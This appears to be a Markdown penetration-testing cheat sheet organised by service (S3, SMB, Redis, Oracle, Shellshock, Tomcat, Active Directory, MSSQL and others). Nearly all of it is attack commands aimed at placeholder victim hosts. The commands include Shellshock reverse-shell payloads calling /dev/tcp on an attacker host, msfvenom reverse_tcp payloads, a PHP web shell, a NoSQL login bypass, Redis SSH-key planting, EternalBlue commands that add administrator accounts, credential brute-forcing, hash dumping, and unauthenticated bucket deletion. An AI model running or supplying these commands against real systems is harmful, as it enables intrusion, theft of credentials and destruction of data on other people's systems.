- [Amazon_S3](#Amazon_S3)
- [DNS](#DNS)
- [FTP](#FTP)
- [Finger](#Finger)
- [HTTP](#HTTP)
- [SQL](#SQL)
- [ORACLE](#Oracle)
- [NFS](#NFS)
- [SSH](#SSH)
- [RDP](#RDP)
- [RPC](#RPC)
- [SNMP](#SNMP)
- [SMTP](#SMTP)
- [POP3](POP3)
- [SMB](#SMB)
- [Redis](#Redis)
- [VNC](#VNC)
- [Webdav](#Webdav)
- [noSQL](#noSQL)
- [Port knocking](#Port_knocking)
- [Shell Shock](#Shellshock)
- [Apache Tomcat](#Apache-Tomcat)
- [Active Directory](#Active-Directory)
- [MSSQL](#MSSQL)

--------------------------------------------------------------------------------------------------------------------------------

## Amazon_S3

--------------------------------------------------------------------------------------------------------------------------------

***Bucket is a logical unit of storage in Amazon Web Services (AWS) object storage service, Simple Storage Solution S3. 
Buckets are used to store objects, which consist of data and metadata that describes the data.***

### awscli install
- pip3 install awscli

### aws configue if we have data
- aws configure

### list aws bucket
- aws s3 ls s3://<victim_aws_bucket_name>

***with no creds***
- aws s3 ls s3://<victim_aws_bucket_name> --no-sign-request

### file upload 
- echo "test" >> file.txt
- aws s3 cp file.txt s3:<victim_aws_bucket_name>/file.txt 

***with no creds***
- aws s3 cp file.txt s3:<victim_aws_bucket_name>/file.txt  --no-sign-request

### file remove
- aws s3 rm file.txt s3:<victim_aws_bucket_name>/file.txt
  
***with no creds***
- aws s3 rm file.txt s3:<victim_aws_bucket_name>/file.txt  --no-sign-request

### bucket remove
- aws s3 rb file.txt s3:<victim_aws_bucket_name>

***with no creds***
- aws s3 rb file.txt s3:<victim_aws_bucket_name>  --no-sign-request

### bucket list recursive
- aws s3 cp s3://<victim_aws_bucket_name> . --recursive

***with no creds***
- aws s3 cp s3://<victim_aws_bucket_name> . --recursive --no-sign-request


--------------------------------------------------------------------------------------------------------------------------------

# DNS

--------------------------------------------------------------------------------------------------------------------------------

## Interacting with a DNS Server
```
- host -t ns [victim_domain]
- host -t mx [victim_domain]
```

### How to find the A record of а domain
You can see how many A records are there and see the IP Addresses of each one. 
```
nslookup [victim_address]
```
### How to check the NS records of a domain
You can see which is the authoritative server for a specific domain
```
nslookup -type=ns [victim_address]
```
### How to query the SOA record of a domain
You can see the start of authority and get information about the zone. 
```
nslookup -type=soa 
```
### How to find the MX records of a domain
You can see if all the mail servers are working well. 
```
nslookup -query=mx [victim_address]
```
### How to find all of the available DNS records of a domain
You can see all the available DNS records.
```
nslookup -type=any [victim_address]
```

### How to check the using of a specific DNS Server
You can review a particular DNS server.
```
nslookup example.com [ns1.victim_address]
```
### How to check the Reverse DNS Lookup
How verify if an IP address is related to a specific domain
```
nslookup 10.20.30.40
```
```
nslookup
  SERVER [victim_ip]
  [victim_ip]
  
nslookup 
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.  
````

## Check Zone transfer with dig 
```
dig axfr [victim_servername] @victim-ip
```

## Automatic scan DNSrecon
```
dnsrecon -d [victim_scan] -t axfr
```

##  Automatic scan DNSenum
```
dnsenum [victim_scan]
```

### Zone transfer description
Zone file is a file on server contains entries for different Resource Records(RR). These records can provide us a bunch of information about the domain. Each zone file must start with a Start of Authority (SOA) record containing an authoritative nameserver for the domain (for e.g. ns1.google.com for google.com ) and an email address of someone responsible for the management of the nameserver.
Types of Resource Records:
- NS Recors: use the given authoritative nameserver.
- MX Recors: tells us which server is responsible for receiving mails sent to that domain name.
- TXT Records: consists of arbitrarily human readable text in a record.
- CNAME Records: Gives an alias of one name to another.
- A Records: Give us IP-address for a particular domain.

--------------------------------------------------------------------------------------------------------------------------------

# FTP

--------------------------------------------------------------------------------------------------------------------------------

Standard network protocol used for the transfer of computer files from a server to a client on a computer network. FTP is built on a client-server model architecture using separate control and data connections between the client and the server.

Protocols based on FTP:
- FTPS(FTP over SSL):
- SFTP(SSH File Transfer Protocol):
- SCP(Secure Copy):
- TFTP(Trivial File Transfer Protocol):

### nmap FTP scan:
- nmap -p 21 -sV [victim_ip]
- nmap -sV -sC [victim_ip] -p 21
- namp --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-default,ftp-user-enum -p [victim_ip]
- nmap –top-ports 1000 -vv -Pn -b anonymous:password@[victim_ip:21]
- nmap -sU -p 69 --script tftp-enum.nse [victim_ip]
- nmap -oN tftp.nmap -v -sU -sV -T2 –script tftp* -p 69 [victim_ip]

### metasploit ftp module
```
use auxiliary/scanner/tftp/tftpbrute
```
### FTP upload and download file

- Download file from FTP
```
ftp> get file_name
```
- Upload file to ftp
```
ftp> put file_name
```
- In same case we need to turn on binary mode:
```
ftp> binary
```
- FTP anonymous account:
```
anonnymous:anonymous
```

### FTP path_traversal
```
dir ../
ls ../
```

### FTP change directory on Windows server
```
cd /Docume~1/
cd /Progra~1/
```

--------------------------------------------------------------------------------------------------------------------------------

# Finger

--------------------------------------------------------------------------------------------------------------------------------

Name/Finger protocol and the Finger user information protocol are simple network protocols for the exchange of human-oriented status and user information.

### finger user enumeration from commandline 
```
finger [username]@[ip]

finger "|/bin/ls -a /@[victim_ip]"
```

#### finger enumeration script
- https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl


--------------------------------------------------------------------------------------------------------------------------------

# HTTP 

--------------------------------------------------------------------------------------------------------------------------------

Is an application-layer protocol for transmitting hypermedia documents, such as HTML. It was designed for communication between web browsers and web servers

### Directory_scanning
- dir mode
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt
- dns mode
  - gobuster dns -d 10.11.1.x -w ~/wordlists/subdomains.txt
  - gobuster dns -d google.com -w ~/wordlists/subdomains.txt -i (with ip)
- extension usage
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -x .php, .txt, .html
- string usage
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -s "200"
- expanded usage(show full url)
  - gobuster -e dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt
- useragent usage
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -a CustomAgent
- export options
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -o output.txt
- proxy chain
  -  gobuster -o gobuster.txt -e -u http://10.11.1.x/ -w ~/wordlist/shortlist.txt

#### Subdomain searching

#### Nikto scanner

- nikto -h [victim_ip]
- nikto -Display V -h [victim_ip]
- nikto -Display V -o results.html -Format htm -h [victim_ip]
```
0 – File Upload
1 – Interesting File / Seen in logs
2 – Misconfiguration / Default File
3 – Information Disclosure
4 – Injection (XSS/Script/HTML)
5 – Remote File Retrieval – Inside Web Root
6 – Denial of Service
7 – Remote File Retrieval – Server Wide
8 – Command Execution / Remote Shell
9 – SQL Injection
a – Authentication Bypass
b – Software Identification
c – Remote Source Inclusion
x – Reverse Tuning Options (i.e., include all except specified)

example: nikto -Tuning 9 -h [victim_ip]6
```
- Run every scan except number 6 - DOS
```
nikto -Tuning x 6 -h [victim_ip]
```

#### WhatWeb
It is another enum type tool like nikto but looks to be more advanced and prettier in output.

- Usage: 
```
whatweb -v -a 4 http://[victim_ip]
```

#### Cewl
Spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper
- Usage:
```
cewl http://some.app/for/scan --with-numbers > wordlist
```

--------------------------------------------------------------------------------------------------------------------------------

# MYSQL

--------------------------------------------------------------------------------------------------------------------------------
- What is MySQL
MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL
RDBMS: software or service used to create and manage databases based on a relational model

## MySQL enumeration
- MySQL tools
```
sudo apt install default-mysql-client
```
- connect to mysql
```
mysql -h [IP] -u [username] -p 
```

- sql nmap scan 
  - nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql- variables,mysql-vuln-cve2012-2122 [victim_ip] -p 3306
  - nmap -sV -Pn -vv -script=mysql* [victim_ip] -p 3306
  - nmap -sU --script=ms-sql-info [vicrim_ip] -p 3306

- sql metasploit enumeration module
```
auxiliary/admin/mysql/mysql_sql
```

- sql metasploit scan
```
  msf > use auxiliary/scanner/mssql/mssql_ping
  msf> use auxiliary/scanner/mssql/mssql_login
  msf> use exploit/windows/mssql/mssql_payload
  set PAYLOAD windows/meterpreter/reverse_tcp

Gain shell using gathered credentials
  msf > use exploit/windows/mssql/mssql_payload
  msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

- mysql metasploit sql schema dump module
```
mysql_schemadump
```

- mysql metasploit sql table and columns dump module
```
auxiliary/scanner/mysql/mysql_hashdump
```

- mysql commands
```
mysql> select do_system('id');
mysql> \! sh
```
- mssql server config file
```
cat freetds.conf

host = $ip
port = 1433
tds version = 8.0
user=sa

root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
```

#### tool mysqldump

binary: mysqldump
```
mysqldump --user=<user_name> --password=<user_password> --host=localhost <database name>

for example:
mysqldump --user=user_name --password=password_value --host=localhost Magic
```

-------------------------------------------------------------------------------------------------------------------------------

# Oracle 

--------------------------------------------------------------------------------------------------------------------------------

tool: https://github.com/quentinhardy/odat

## SIDs enumeration

- Identify SIDs via odat.py tool
```
python3 odat.py sidguesser -s <victim_ip>
```

- Identify SIDs via metasploit
```
msf > use auxiliary/admin/oracle/sid_brute 
msf auxiliary(admin/oracle/sid_brute) > set rhost <victim_ip>
msf auxiliary(admin/oracle/sid_brute) > run
```

## Brute force credentials 

- via odat.py
```
locate oracle_default_userpass.txt

python3 odat.py passwordguesser -s <victim_ip> -p 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt
```

- via metasploit
```
msf > use auxiliary/admin/oracle/oracle_login
msf auxiliary(admin/oracle/oracle_login) > set sid (for example XE)
msf auxiliary(admin/oracle/oracle_login) > set rhost <victim_ip>
msf auxiliary(admin/oracle/oracle_login) > run
```
Brute force credentials via metasploit

## Exploitation

- Generate payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<my_port> -f exe > rs_file.exe
```
- upload file
```
python3 odat.py utlfile -s <victim_ip> -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp rs_file.exe rs_file.exe
```

- execute file 
```
Run netcat
 nc -lnvp <your_port>
python3 odat.py externaltable -s <victim_ip> -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
```


--------------------------------------------------------------------------------------------------------------------------------------

# NFS

--------------------------------------------------------------------------------------------------------------------------------

- The Network File System (NFS) is a client/server application that lets a computer user view and optionally store and update files on a remote computer as though they were on the user's own computer. The NFS protocol is one of several distributed file system standards for network-attached storage (NAS).


- Install basic  tools
```
sudo apt install nfs-common
```

- List the NFS shares
```
usr/sbin/showmount -e [IP]
```

- Mounting NFS shares
```
mkdir /tmp/mount
sudo mount -t nfs IP:share /tmp/mount/ -nolock

-nolock	Specifies not to use NLM locking
```

- nmap_scan 
```
nmap -sV --script=nfs-showmount [victim_ip]
nmap -p [victim_port] --script=nfs-ls,nfs-statfs,nfs-showmount [victim_ip]
```

## Exploiting NFS
If machine has an NFS share you might be able to use that to escalate privilege.

- What is root_squash
By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

- Exploit NFS pathway
1)  NFS Access
2)  Gain Low Privilege Shell
3)  Upload Bash Executable to the NFS share
4)  Set SUID permissions Through NFS Due To Misconfigured Root Squash
5)  Login through SSH
6)  Execute SUID Bit Bash Executable
7)  ROOT


--------------------------------------------------------------------------------------------------------------------------------------

# SSH 

--------------------------------------------------------------------------------------------------------------------------------

#### SSH enumeration with metasploit module
```
use auxiliary/scanner/ssh/ssh_enumusers
set user_file /usr/share/wordlists/metasploit/unix_users.txt or set user_file /usr/share/seclists/Usernames/Names/names.txt
run
```

#### SSH data bruteforce with hydra
```
hydra -v -V -l root -P password-file.txt [victim_ip] ssh
hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 [victim_ip] ssh
```

#### ssh keygen process
```
ssh-keygen
mkdir /mnt/user_name/.ssh
touch /mnt/user_name/.ssh/authorized_keys
cat ~/.ssh/id_rsa.pub > /mnt/user_name/.ssh/authorized_keys
ssh use_name@[victim_ip
```

#### usefull ssh exploits
- https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/40136.py

- https://github.com/g0tmi1k/debian-ssh

--------------------------------------------------------------------------------------------------------------------------------------

# RDP

--------------------------------------------------------------------------------------------------------------------------------

#### Connect to remote desktop 
```
rdesktop -g 1440x900 -u user_login -p user_pass [victim_ip]
```

#### rdp nmap scan
```
nmap -p 3389 --script rdp-ntlm-info [victim_ip]
```

#### bruteforce rdp credentials
```
hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[victim_ip]
ncrack -vv --user administrator -P password-file.txt rdp://[victim_ip]
```

--------------------------------------------------------------------------------------------------------------------------------------

# rpc

--------------------------------------------------------------------------------------------------------------------------------

```
rpcinfo -p [victim_ip]
```

#### rpc nmap scan
```
nmap [vitim_ip] --script msrpc-enum
```

#### rpc metasploit scan
```
msf> use exploit/windows/dcerpc/ms03_026_dcom
```

--------------------------------------------------------------------------------------------------------------------------------------

# SNMP

--------------------------------------------------------------------------------------------------------------------------------

#### SNMP_Description

SNMP is based on UDP, a simple, stateless protocol, and therefore susceptible to IP spoofing and replay attacks. SNMP information and credentials can be easily intercepted over a local network.

#### MIB Tree

SNMP Managment Information Base (MIB) is a database contains info related to network management. 

#### nmap
```
nmap -sU --open -p 161, [victim_ip] 
```

#### snmpwalk scan 
- snmpwalk -c public [victim_ip] -v1
- snmpwalk -c private [victim_ip] -v1
- snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'
- snmpset -v 1 -c public [victim_ip] .1.3.6.1.2.1.1.5 s HACKED
- snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'

#### SNMP-CHECK
- snmp-check -c public 10.11.1.x

-------------------------------------------------------------------------------------------------------------------------------------

# SMTP

- Waht is SMTP
It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP

The SMTP server performs three basic functions:
  - It verifies who is sending emails through the SMTP server.
  - It sends the outgoing mail
  - If the outgoing mail can't be delivered it sends the message back to the sender

- POP and IMAP
POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new.

- How does SMTP works
1) Mail user client connect to SMTP server. Thats initiates the SMTP handshake. This connection works over the SMTP port(usually 26)
2) The client submit sender and recipient email address, the body of the email and any attachments, to server.
3) The SMTP server check whether the domain name of the recipient and the sender is the same
4) The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server cant be accessed, or is not-available-the Email gets put into an SMTP queue
5) Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised
6) The E-Mail will then show up in the recipient's inbox

## SMTP Enumeration

- fingerprint SMTP
```
metasploit: smtp_version
```

- Enumerating Users from SMTP
The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists))
```
metasploit: smtp_enum
nonmetasploit: smtp-user-enum
```



--------------------------------------------------------------------------------------------------------------------------------

## Netcat
```
nc -nv [victim_ip] [smtp_port]
```
- VRFY root
- VRFY [some_user_name]
***VRFY***: verify an email address
***EXPN***: asks the server for the membership of mailing list

## Telnet
```
telnet <victim_ip> <port>

telnet <victim_ip> <port>
>EHLO root
>DATA
>QUIT
```
## Metasploit
```
auxiliary/scanner/smtp/smtp_enum
```
## smtp-user-enum
```
perl smtp-user-enum -M VRFY -U user.txt -t <victim_ip
```
dictionary
 - /usr/share/wordlists/metasploit/unix_users.txt
 - /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt

## nmap
```
nmap –script smtp-enum-users.nse <victim_ip>
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [victim_ip]
```

## Bruteforce
```
hydra -P /usr/share/wordlistsnmap.lst [victim_ip] smtp -V
```

-------------------------------------------------------------------------------------------------------------------------------------

# POP3

--------------------------------------------------------------------------------------------------------------------------------

## Telnet
```
telnet [victim_ip] [pop3_port]
> USER username
> PASS userpass
> RETR 1 or 2.. etc
```
- dictionary: /usr/share/wordlist/fasttrack.txt

-------------------------------------------------------------------------------------------------------------------------------------

# SMB

--------------------------------------------------------------------------------------------------------------------------------
SMB - Server message protocl - is's protocol for sharing files and resources, printers.. on a network.
Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network.
  
#### smb_nmap

- nmap -v -p 139,445 --script=smb-os-discovery [victim_ip]
- nmap -v -sSVC -p 139,445 --script discovery [victim_ip]
- nmap --script smb-enum-shares -p 139,445 [victim_ip]
- nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse [victim_ip]
- nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse [victim_ip]
- nmap -sV -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 [victim_ip]

#### rpcclient
- rpcclient -U "" -N [victim_ip]
```
  -U "" - null session
  -N - no password
```

- Get a list of users
```
enumdomusers
```

- Get a user info
```
queryuser <rid_number>
```

- Get a list of groups
```
enumdomgroups
```

- Get a group members
```
querygroup <rid_number>
```


#### NetBIOS_Service
- nbtscan -r [victim_ip]

#### smbmap
  - smbmap -H <victim_ip>
  - smbmap -H <victim_ip> -R
  - smbmap -H <victim_ip> -u login -p password
  - smbmap -H <victim_ip> -u anonymous -d directory
  
## smbclinet
  - smbclient \\\\[victim_ip]\\[sharename]
  - smbclient -N -L \\\\\[victim_ip]
  - smbclient -N -L //[victim_ip]/directory
  - smbclient //[victim_ip]/"[victim_folder]" -m NT1 --option="client min protocol=NT1"
  - smbclient -L <victim_ip> -U user_name
  - smbclient //<victim_ip/<resources> -U "user_login"
  - smbclient -U 'user%password' //<victim_ip>/resources
 
 ### smb password change
```
smbpasswd -r <victim_ip -U <user_name>
```

### smbclinet_file_upload
```
smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
```
 
#### enum4linux
  - Share Enumeration:
    - enum4linux-S [victim_ip]
  - Usernames Enumeration:
    - enum4linux -U -P [victim_ip]
  - All Enumeration:  
    - enum4linux -a [victim_ip]
  - enum4linux -a  [victim_ip]
  - enum4linux -u 'guest' -p '' -a  [victim_ip]
  
#### eternalblue

### mmap_script:
```
nmap -v --script vuln [victim_ip] -p 445,139
nmap -sV -script smb-vuln-ms17-010.nse [victim_ip] -p 139,44
```

#### crackmapexec
```
crackmapexec smb <victim_ip>
```

#### psexec
- Tool:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
  - https://github.com/skalkoto/winexe
#### eternal_blue_metasploit
```
example one:
use auxiliary/admin/smb/ms17_010_command
set rhosts: [victim_ip]
set rport: 445
set command: net user test test123! /add
run
set command: net localgroup administrators tester /add
run

example two:
use exploit/windows/smb/ms17_010_psexec
set rhosts [victim_ip]
run
```

### tools_for_eternalblue
- https://github.com/worawit/MS17-010
- https://github.com/3ndG4me/AutoBlue-MS17-010
- https://github.com/sailay1996/eternal-pulsar
- https://gist.github.com/thel3l/993f8ed81a56e10525dd4812ad01ff2a
- https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/
    
## msfconsole
  - set rhosts 192.168.55.248
  - use auxiliary/scanner/smb/smb_enumusers
    - run
  - use auxiliary/scanner/smb/smb_enumshares
    - run
  - use auxiliary/scanner/smb/smb_version

## null_session
- null session and extract information
- nbtscan -r [victim_ip]

## Bruteforce
- hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 [victim_ip] smb

## Smb_version_checker 
```
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```

## SMB_perl_script
- https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/7.pl

-------------------------------------------------------------------------------------------------------------------------------------
# Redis:

--------------------------------------------------------------------------------------------------------------------------------

Data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes with radius queries and streams

#### nmap

#### telnet
```
telnet <victim_ip> <redis_port_usually_6379>
```

#### nc
```
nc <victim_ip> <redis_port_usually_6379>
```

#### Generate SSH key
```
ssh-keygen -t rsa b 4096 -C <youremail>@<email_domain>
```

### Add random data before and after our key:
```
- (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```

### Connect to redis 
```
apt-get install redis-tools
redis-cli -h <victim_ip>
````

### Flush keys\
```
redis-cli -h <victim_ip> -p 6379 flushall
```

### Set our keys into the database
```
cat key.txt | redis-cli -h <victim_ip> -p 6379 -x set bb
```

### Check the current folder 
```
>config get dir
```

### Change out directory
```
> config set dir /<victim_user_name>/.ssh/
for examople: config set dir /var/lib/redis/.ssh/
```

### Change name of our file
```
> set dbfilename "authorized_keys"
```

### Save changes
```
> save
```
### Try to login into server via SSH
```
chmod 600 id_rsa
ssh -i id_rsa redis@<victim_ip>
```

-------------------------------------------------------------------------------------------------------------------------------------

# VNC

--------------------------------------------------------------------------------------------------------------------------------

Gaphical desktop sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another. 

## VNC_nmap
```
nmap -sV --script realvnc-auth-bypass.nse [victim_ip] -p 5900

nmap --script vnc-info [victim_ip] -p 5901
```
## VNC_exploit
```
https://www.exploit-db.com/exploits/36932
```
## MSF_VNC_auth_none
```
  msf > use auxiliary/scanner/vnc/vnc_none_auth
  msf > set RHOSTS [target_ip]
  msf > set THREADS [int]
  msf > run
```

## MSF_VNC_password_attack
```
  msf > use auxiliary/scanner/vnc/vnc_login
  msf > set rhosts [victim_ip]
  msf > set rport [victim_ip
  msf > set pass_file /your/dictionary/file
  msf > run
```

## MSFVenom_VNC_payload
```
msfvenom -p windows/vncinject/reverse_tcp lhost=[your_ip] lport=[your_port] -f exe > /var/www/html/vnc.exe

  msf > use exploit/multi/handler
  msf > set payload/widnows/vncinject/reverse_tcp 
  msf > set lport [your_ip]
  msf > set lport [your_port]
  msf > set viewonly false
  msf > run
```

## VNC_post_exploitation
```
meterpreter > run vnc
```

## VNC_access
```
sudo apt install tigervnc-viewer
vncviewer [victim_ip]:[victim_port]
```
-------------------------------------------------------------------------------------------------------------------------------------

# Webdav

--------------------------------------------------------------------------------------------------------------------------------

## webdav_scanner
```
davtest-url [victim_url]
davtest -move -senddb auto -url http://[victim_ip]:[victim_port]
```

## metasploit
```
  use auxiliary/scanner/http/webdav_scanner
  use auxiliary/scanner/http/webdav_internal_ip
  use auxiliary/scanner/http/webdav_website_content
```

## webdav_via_curl
```
echo xyz > test.txt
curl -X PUT http://[victim_ip]/test.txt -d @test.txt
curl https://[victim_ip]/test.txt
```

## change_extension 
```
curl -X MOVE -H 'Destination http://[victim_ip/test.php] http://[victim_ip]/test.txt
```

## Semicolen_file_extension_bypassing
```
upload file as file.asp;.jpg
```

## cadaver_tool
```
cadaver http://[victim_ip]/path/
  - dav:/path/> put file.txt
  - dav:/path/> move file.txt file.asp;.txt
```  

## Use_PUT_method
```
use burp
PUT /test/shell.php

<?php system($_GET["cmd"])?>
```

-------------------------------------------------------------------------------------------------------------------------------------

# noSQL

-------------------------------------------------------------------------------------------------------------------------------------

- Basic auth bypass
```
username[$ne]=admin&password[$ne]

json:

{"username": {"$ne": null}, "password: {"$ne": null} }
```

- Enumeration automation tool

https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration

-------------------------------------------------------------------------------------------------------------------------------------

# Port_knocking

--------------------------------------------------------------------------------------------------------------------------------

## configure_file
```
/etc/knocked.conf
**squence** value its sequence of ports someone must access to open or close port.
```
## bash_script
```
for i in 7 2350 43;
  do nmap -Pn -p $i --host-timeout 201 --max-retries 0 [victim_ip]; 
done
```
## nmap_port_knocking
```
nmap -Pn -p $i --host-timeout 100 --max-retries 0 [victim_ip]; 
```
## hping_port_knocking
```
hping3 -S [victim_ip] -p 1 -c 1
```
-------------------------------------------------------------------------------------------------------------------------------------
# Shellshock

## manual_exploitation

- echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc [victim_ip] 80

- curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" [victim_ip]/cgi-bin/status

- curl http://[victim_ip]/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "

- curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[your_ip]/[your_port] 0>&1' http://[victim_ip]/cgi-bin/test.sh


## exploitaion_SSH
```
ssh username@$[victim_ip] '() { :;}; /bin/bash'
```
## nmap_script
```
nmap --script -p [victim_port] http-shellshock --script-args uri=[/vuln/path] cmd=[yours_command] [victim_ip]
```
## smb
```
#TODO
```

## Shellshock_tool
***shocker***: https://github.com/nccgroup/shocker

shocker sample:
``` 
python shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------

# Apache Tomcat
--------------------------------------------------------------------------------------------------------------------------------

## Get tomcat-users
- /usr/share/tomcat9/etc/tomcat-users.xml
- 

## Upload war file via commandline

- upload file
```
curl -u '<username>':'<userpassword>' -T reverseshell_file.war 'http://<victim_ip>:8080/manager/text/deploy?path=/rev_shell'
```

- get shell
```
curl -u '<username>':'<userpassword>' http://<victim_ip>:8080/rev_shell
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------

# Active Directory

--------------------------------------------------------------------------------------------------------------------------------

#### Kerberos
Protocol for authentication and authorization in a computer network with the use of a key distribution center

- Kerberos preauthentication (ASREPRoast)
The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password(TGT encrypted) could be cracked offline.
```
impacket/example GetNPUsers <domain.name>/ -dc-ip <victim_ip> -request

impacket/example GetNPUsers.py <domain.name>/ -no-pass -usersfile userslist.txt -dc-ip <victim_ip>
```

Cracking TGT hash
```
hashcat -m 18200 --force -a 0 hashes.file rock_you.txt
```

```
john --wordlist=rock_you.txt hashes.file
```

- Gain access
- https://github.com/Hackplayers/evil-winrm
```
ruby evil-winrm.rb --user fsmith --password password --ip 10.10.10.175
```

- AD password hashes dump from the Ntds.dit database
```
impacket/exampl secretsdump.py -just-dc <domain.name>/user_name:"user_password"@<victim_ip>

example hash:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::

Administrator is the user name
500 is the relative identifier
aad3b435b51404eeaad3b435b51404ee is the LM hash
9485863c1e9e05851aa40cbb4ab9dff is the NT hash
```

- Gain access with NT Hash
- https://github.com/Hackplayers/evil-winrm
```
evil-winrm --user Administrator -H NT-hash --ip <victim_ip>
```



- Kerberos brute-force

Tool: https://github.com/TarlogicSecurity/kerbrute

Usage:
```
python kerbrute.py -domain domain.name -users users.txt -passwords passwords.txt -outputfile output_file_name.txt
```

- Kerberoasting



- Overpass The Hash/Pass The Key (PTK)
This attack aims to use user NTLM hash to request Kerberos tickets, as an alternative to the common Pass The Hash over NTLM protocol.

Usage:
```
impacket-getTGT domain.name/user_name -hashes :<NTLM hash>
```

- Pass the ticket(PTT)

- Silver ticket

- Golden ticket

--------------------------------------------------------------------------------------------------------------------------------

# MSSQL

--------------------------------------------------------------------------------------------------------------------------------
- Connect to the mmsql server via mssqlclient.py from impacket
```
mssqlclient.py [user_name]@[victim_ip] -db db_name -windows-auth
```

- Check xp_cmdshell
```
SQL>enable_xp_cmdshell
```

- Responder and xp_dirtree

On local host
```
responder -I tun0

tun0 is example interface
```

On attacking machine
```
SQL> EXEC MASTER.sys.xp_dirtree '\\[victim_ip]\some_test'
```

After this step on localmachine we should get NTLMv2 hash 

